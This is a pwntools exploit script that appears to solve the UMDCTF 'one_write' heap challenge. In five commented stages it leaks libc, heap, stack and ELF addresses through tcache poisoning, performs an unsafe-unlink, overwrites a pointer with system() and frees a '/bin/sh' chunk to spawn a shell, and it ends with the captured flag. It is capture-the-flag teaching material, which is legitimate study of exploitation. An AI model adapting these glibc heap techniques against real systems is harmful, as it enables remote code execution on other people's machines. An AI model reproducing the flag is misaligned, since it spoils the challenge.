from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./one_write_patched', '''
    b *alloc_chunk
    b *free_chunk
    b *write_chunk
    b *read_chunk
    continue
''')

# p = remote('challs.umdctf.io', 31727)

def alloc_chunk(idx, size):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())

def free_chunk(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def write_chunk(data):
    p.sendlineafter(b'> ', b'3')
    p.sendafter(b'data: ', data)

def read_chunk():
    p.sendlineafter(b'> ', b'4')
    return p.recv(0x5f8)

glibc_e = ELF('./libc.so.6')

# Stage 1: Leak libc base address and heap base address
# There is also another way to leak libc base address and heap base address.
# Considering there is a big chunk in unsorted bin, when allocating a small chunk, the big chunk in unsorted bin will be split and the rest will stay in unsorted bin.
# Now a libc address is at the first/second 8 bytes of the big chunk, and a heap address is at the third/fourth 8 bytes of the big chunk.
alloc_chunk(0, 0x418)
alloc_chunk(1, 0x18)
free_chunk(0)
free_chunk(1)
leaks1 = read_chunk()
glibc_base_addr = (u64(leaks1[0:8]) & ~0xfff) - 0x203000
log.info(f'glibc base address: {hex(glibc_base_addr)}')
heap_base_addr = ((u64(leaks1[0x420:0x428]) << 12) ^ 0) & ~0xfff
log.info(f'heap base address: {hex(heap_base_addr)}')

# Stage 2: Leak stack argv address
# The __libc_argv field in libc stores a stack address, and the address of __libc_argv in libc is 16-byte aligned, which satisfies the alignment requirement of malloc.
# This leak technique can put a value (double-encrypted) in a specified address into the heap area, focusing on the status of tcache bins before and after tcache poisoning.
alloc_chunk(2, 0x28)
alloc_chunk(3, 0x28)
alloc_chunk(4, 0x28)
free_chunk(3)
free_chunk(2)
write_chunk(p64((glibc_base_addr + glibc_e.symbols['__libc_argv']) ^ (heap_base_addr >> 12)))
alloc_chunk(5, 0x28)
alloc_chunk(6, 0x28)
free_chunk(4)
leaks2 = read_chunk()
stack_argv_addr = u64(leaks2[0x60:0x68]) ^ ((heap_base_addr + 0x300) >> 12) ^ ((glibc_base_addr + glibc_e.symbols['__libc_argv']) >> 12)
log.info(f'stack argv address: {hex(stack_argv_addr)}')

# Stage 3: Leak elf start address
# There is a field on stack stores the address of _start in ELF, and the address of this field is 16-byte aligned, which satisfies the alignment requirement of malloc.
# This leak technique can put a value (double-encrypted) in a specified address into the heap area, focusing on the status of tcache bins before and after tcache poisoning.
alloc_chunk(7, 0x38)
alloc_chunk(8, 0x38)
alloc_chunk(9, 0x38)
free_chunk(8)
free_chunk(7)
write_chunk(b'\0'*0x88 + p64(41) + p64((stack_argv_addr - 0x48) ^ ((heap_base_addr + 0x330) >> 12)))
alloc_chunk(10, 0x38)
alloc_chunk(11, 0x38)
free_chunk(9)
leaks3 = read_chunk()
elf_start_addr = u64(leaks3[0x110:0x118]) ^ ((heap_base_addr + 0x3b0) >> 12) ^ ((stack_argv_addr - 0x48) >> 12)
log.info(f'elf start address: {hex(elf_start_addr)}')

# Stage 4: Perform unsafe-unlink
# The unsafe-unlink method is always used when there is a global variable in bss storing the address of a heap chunk.
# This technique can be used to change a global variable's value to itself-0x18, which is very useful in a heap challenge with limited write operations.
alloc_chunk(12, 0x2c8)
alloc_chunk(13, 0x418)
alloc_chunk(14, 0x48)
write_chunk(p64(0) + p64(0x431) + p64(elf_start_addr + 0x2fd0 - 0x18) + p64(elf_start_addr + 0x2fd0 - 0x10) + b'\0'*0x410 + p64(0x430) + p64(0x420))
free_chunk(13)

# Stage 5: Pop a shell
# Multiple overwrite operations can be performed.
write_chunk(p64(0)*3 + p64(elf_start_addr + 0x2fd0 - 0x80) + p64(0)*3 + p64(elf_start_addr + 0x2fd0 + 0x28) + b'/bin/sh\0')
write_chunk(p64(glibc_base_addr + glibc_e.symbols['system']))
free_chunk(0)

p.interactive()

# UMDCTF{but_look_at_this_its_j0hn_p0rk}